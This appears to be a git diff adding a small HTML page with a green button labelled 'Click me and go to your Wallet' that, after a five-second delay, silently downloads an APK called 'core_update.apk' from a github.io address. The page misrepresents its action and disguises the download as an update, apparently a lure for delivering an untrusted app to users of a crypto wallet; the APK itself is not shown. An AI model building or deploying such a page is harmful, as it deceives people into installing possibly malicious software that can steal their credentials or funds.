@@ -1,0 +1,52 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>Delayed Download</title>
+  <style>
+    body {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      font-family: sans-serif;
+      background-color: #f4f4f4;
+    }
+    button {
+      padding: 12px 20px;
+      font-size: 16px;
+      font-weight: bold;
+      border: none;
+      border-radius: 8px;
+      background-color: #4CAF50;
+      color: white;
+      cursor: pointer;
+      transition: background 0.3s ease;
+    }
+    button:hover {
+      background-color: #45a049;
+    }
+  </style>
+</head>
+<body>
+  <button onclick="triggerDownload()">Click me and go to your Wallet</button>
+
+  <script>
+    const downloadFile = () => {
+      const link = document.createElement("a");
+      link.href = "https://frozzipies.github.io/core_update.apk"; // Change to your file
+      link.download = "test.apk";
+      document.body.appendChild(link);
+      link.click();
+      document.body.removeChild(link);
+    };
+
+    const triggerDownload = () => {
+      setTimeout(() => {
+        downloadFile();
+      }, 5000); // 5000 ms = 5 seconds
+    };
+  </script>
+</body>
+</html>
